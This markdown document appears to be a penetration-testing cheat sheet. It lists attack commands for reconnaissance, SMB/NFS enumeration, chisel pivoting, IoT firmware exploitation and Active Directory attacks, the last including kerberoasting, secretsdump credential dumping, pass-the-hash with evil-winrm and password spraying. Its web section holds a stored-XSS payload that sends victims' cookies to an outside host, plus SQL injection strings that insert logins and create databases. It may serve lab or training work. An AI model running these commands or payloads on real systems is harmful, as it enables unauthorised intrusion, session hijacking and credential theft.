# Basic Commands and Techniques

---

### <u>1. Recon </u>

- Nmap - General Scan
  

```bash
nmap -Pn -T5 -sC -sV -oN InitialScan_NMAP <IP> # General Scan
```

- Nmap - Full Scan
  

```bash
nmap -Pn -p- -oN All_Ports_Nmap <IP> --min-rate=10000 # Full Scan
```

- Rustscan
  

```bash
rustscan -a <IP>
```

- Nikto
  

```bash
nikto -h http://IP 
```

- Finger - User enum
  

```bash
finger @ IP
finger admin @ IP
```

- Scan Table
  

|     | 10.10.10.10 | 20.20.20.20 |
| --- | --- | --- |
| **OS** | Windows 7 | Linux |
| **Ports** | 3389 | 22,80 |
| **Services** | RDP | SSH, HTTP |
| **Vulns** |     |     |
| **Exploits** |     |     |
| **Notes** |     |     |
| **Priority** |     |     |

---

### <u>2. External</u>

- FTP
  

```bash
ftp <IP> #username = anonymous and password blank
=> put file.txt #upload
=> get file.txt #Download
```

- CMS - Wordpress
  

```bash
wpscan --url http://IP -e u p 
```

---

### <u>3. Internal</u>

- Ping Sweep
  

```bash
sudo netdiscover
netdiscover -i eth0 -p #passive - takes time
netdiscover -i eth0 -r IP subnet
nmap -sP IP #Ping Sweep


for i in $(seq 254);do ping 10.10.10.${i} -c1 -W1;done | grep from
```

- Db_Nmap
  

```bash
sudo msfdb init
workspaces -a #Lists all workspaces
db_nmap -sS IP #General Scaning methods
Hosts
Services
```

- SMB - Samba
  

```bash
nmap --script smb-os-discovery IP
smbclient -L \\\\IP\\share -N 
smbmap -H IP -U username -P Password -d domain.htb
enum4linux -a IP
```

- RPC and NFS
  

```bash
showmount -e IP
sudo mount -t nfs IP:/path /created_dir -o nolock
```

---

### <u>4. Pivoting</u>

- Chisel
  

```bash
#Attacker Machine
chisel server --socks5 --reverse

#Victim Machine - Just a single port frwd
chisel client --fingerprint <That Hash> <Attacker IP : Listen Port> R:New_Listen_port:Victim IP:Victim Port


chisel client --fingerprint <That Hash> <Attacker IP : Listen Port> R:socks
```

- RDP
  

```bash
xfreerdp /v:Victim_IP /u:Administrator
proxychains xfreerdp /v:Victim_IP /u:Administrator #If pivot
```

---

### <u>5. IOT</u>

| Description | Command |
| --- | --- |
| Identify the filetype | file firmware.bin |
| gather the hexdump | hexdump -c firmware.bin \| more => qshs = squashfs |
| Extract the fireware | binwalk -e firmware.bin |
| Firmadyne Extracting the firmware | sudo python3 sources/extractor/extractor.py -b Netgear -sql 127.0.0.1 -np -nk "WNAP320 Firmware Version 2.0.3.zip" images |
| Get the architecture of the firmware | sudo bash scripts/getArch.sh images/1.tar.gz. |
| load the contents of the filesystem for firmware 1 into the database and populate the object and object_to_image tables | sudo python3 scripts/tar2db.py -i 1 -f images/1.tar.gz. |
| Configure the Network | sudo bash scripts/inferNetwork.sh |
| Execute the script | sudo bash scratch/1/run.sh. |
| Extract Data using SNMP | sudo bash analyses/snmpwalk.sh 192.168.0.100 |
| Make a new folder and try these exploits | sudo chmod +x analyses/runExploits.py.<br/>sudo python analyses/runExploits.py -t 192.168.0.100 -o exploits/exploit -e x. |

---

### <u>6. Web Vulns</u>

| Description | Command |
| --- | --- |
| Stored XSS, Cookie Steal Script | <a onclick="document.location='http://www.oceanplaza.com/Default.aspx?cookie='+escape(document.cookie);" href=#> trust me </ar> |
| IDOR | Visit Profile Pages or any other pages and change the ID |
| SQLI | Sqlmap -r for_sql.req --dumps --tables<br/><br/><br/>Sqlmap -u 'domain' -X POST --data "<Paste the Request>" --dumps --tables<br/><br/>admin' OR 1=1 --<br/><br/>admin' ;insert into login values('superman','superman123');--<br/><br/>admin' ;create database kryptonite;-- |

---

### 7. Active Directory

- Group Policy Hash
  

```bash
gpp-decrypt <hash> # Group Policy XML Hash
```

- BloodHound Ingestor and neo4j
  

```bash
bloodhound-python --dns-tcp -ns <Victim_IP> -d domain.htb -u username -p password

#Start Bloodhound
Terminal 1: neo4j console
Terminal 2: bloodhound
```

- Kerberoasting - 2 Ways
  

```bash
1. GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <victimIP> domain.htb/
2. GetNPUsers.py -request -dc-ip <victimIP> domain.htb/
3. GetUserSPNs.py -request -dc-ip <victimIP> domain.htb/username
```

- psexec.py
  

```bash
psexec.py domain.htb/username@IP
```

- SecretsDump.py
  

```bash
secretsdump.py -just-dc username@IP
```

- Evil-WinRM
  

```bash
evil-winrm -i IP -u Administrator -H Hash
```

- Crackmapexec
  

```bash
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
```
